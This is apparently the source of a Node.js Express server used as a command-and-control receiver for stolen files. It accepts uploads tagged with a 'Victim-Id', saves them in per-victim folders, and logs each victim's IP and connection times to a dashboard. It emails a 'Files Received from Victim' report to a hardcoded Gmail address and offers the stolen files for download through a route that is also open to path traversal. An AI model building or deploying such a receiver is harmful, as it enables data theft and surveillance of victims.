const fs = require('fs');
require('dotenv').config();
const cors = require('cors');
const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080; // Railway assigns a port dynamically

// Enable CORS with specific options ok 
const corsOptions = {
  origin: 'https://deobfrontend-4mu41vc3s-2naseernoors-projects.vercel.app',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
  credentials: true,
};
app.use(cors(corsOptions));

// Log all incoming requests for debugging
app.use((req, res, next) => {
  console.log('📥 Request:', req.method, req.url, 'Headers:', req.headers);
  next();
});

// Handle OPTIONS requests for /upload
app.options('/upload', (req, res) => {
  res.header('Access-Control-Allow-Origin', corsOptions.origin);
  res.header('Access-Control-Allow-Methods', corsOptions.methods.join(', '));
  res.header('Access-Control-Allow-Headers', corsOptions.allowedHeaders.join(', '));
  res.header('Access-Control-Allow-Credentials', 'true');
  res.status(204).end();
});

// Serve the dashboard as static files
app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));

app.get('/dashboard/', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard', 'index.html'));
});

// Middleware to handle raw binary data for file uploads
app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));

// Base directory for storing files
const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
if (!fs.existsSync(OUTPUT_BASE_DIR)) {
  fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
}

// Email Setup (Check if environment variables are available)
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || '',
    pass: process.env.EMAIL_PASS || '',
  },
});

const victimFolders = {};
const victimFileCounts = {};
const victimTotalFiles = {};
const victimFiles = {};
const connectedDevices = {};

// Function to send email
async function sendEmail(victimId, files) {
  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
    console.error('❌ Email not sent: Missing EMAIL_USER or EMAIL_PASS');
    return;
  }

  console.log(`🔍 Preparing to send email for victim ${victimId}...`);

  const fileRows = files
    .map(
      (file, index) => `
      <tr>
        <td>${index + 1}</td>
        <td>${file.name}</td>
        <td>${file.type}</td>
        <td>${file.size} bytes</td>
      </tr>`
    )
    .join('');

  const htmlContent = `
    <h2>Files Received from Victim ${victimId}</h2>
    <p>The following files were received:</p>
    <table border="1">
      <tr>
        <th>#</th>
        <th>File Name</th>
        <th>File Type</th>
        <th>File Size</th>
      </tr>
      ${fileRows}
    </table>`;

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'naseer.ord@gmail.com',
    subject: `Files Received from Victim ${victimId}`,
    html: htmlContent,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log(`✅ Email sent: ${info.response}`);
  } catch (error) {
    console.error(`❌ Error sending email:`, error.message);
  }
}

// Function to check if all files are received and send email
async function checkAndSendEmail(victimId, victimFolder) {
  const filesInFolder = fs.readdirSync(victimFolder);
  if (filesInFolder.length === victimTotalFiles[victimId]) {
    console.log(`✅ All files received for victim ${victimId}, sending email...`);

    const files = filesInFolder.map((filename) => {
      const filePath = path.join(victimFolder, filename);
      const stats = fs.statSync(filePath);
      return { name: filename, type: path.extname(filename).substring(1), size: stats.size };
    });

    victimFiles[victimId] = files;
    sendEmail(victimId, files);
  }
}

// Route to handle file uploads
app.post('/upload', (req, res) => {
  try {
    const filename = decodeURIComponent(req.headers['filename']);
    const victimId = decodeURIComponent(req.headers['victim-id']);
    const ip = req.ip;

    if (!filename || !victimId) {
      return res.status(400).json({ error: 'Missing Filename or Victim-Id' });
    }

    if (!connectedDevices[victimId]) {
      connectedDevices[victimId] = {
        ip: ip,
        connectionTime: new Date(),
        lastConnectionTime: new Date(),
        filesTransferred: 0,
        fileList: [],
      };
    } else {
      connectedDevices[victimId].lastConnectionTime = new Date();
    }

    if (!victimFolders[victimId]) {
      const timestamp = new Date().toISOString().replace(/:/g, '-');
      victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
      fs.mkdirSync(victimFolders[victimId], { recursive: true });
      victimFileCounts[victimId] = 0;
      victimTotalFiles[victimId] = parseInt(req.headers['total-files'], 10);
    }

    const victimFolder = victimFolders[victimId];
    const filePath = path.join(victimFolder, filename);

    fs.appendFile(filePath, req.body, (err) => {
      if (err) {
        console.error(`❌ Error writing file:`, err);
        return res.status(500).json({ error: 'Error saving file' });
      }

      console.log(`✅ File received: ${filename}`);
      victimFileCounts[victimId] += 1;
      connectedDevices[victimId].filesTransferred += 1;
      connectedDevices[victimId].fileList.push(filename);

      checkAndSendEmail(victimId, victimFolder);
      res.status(200).json({ message: 'File received successfully' });
    });
  } catch (error) {
    console.error(`❌ Error handling upload:`, error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Route to provide dashboard data
app.get('/dashboard-data', (req, res) => {
  res.json(connectedDevices);
});

// Route to download files
app.get('/download/:victimId/:filename', (req, res) => {
  try {
    const { victimId, filename } = req.params;
    
    if (!victimFolders[victimId]) {
      return res.status(404).json({ error: 'Victim folder not found' });
    }

    const victimFolder = victimFolders[victimId];
    const filePath = path.join(victimFolder, filename);

    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: 'File not found' });
    }

    res.download(filePath, filename, (err) => {
      if (err) {
        console.error(`❌ Error sending file:`, err);
        res.status(500).json({ error: 'Error sending file' });
      }
    });
  } catch (error) {
    console.error(`❌ Error in download route:`, error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
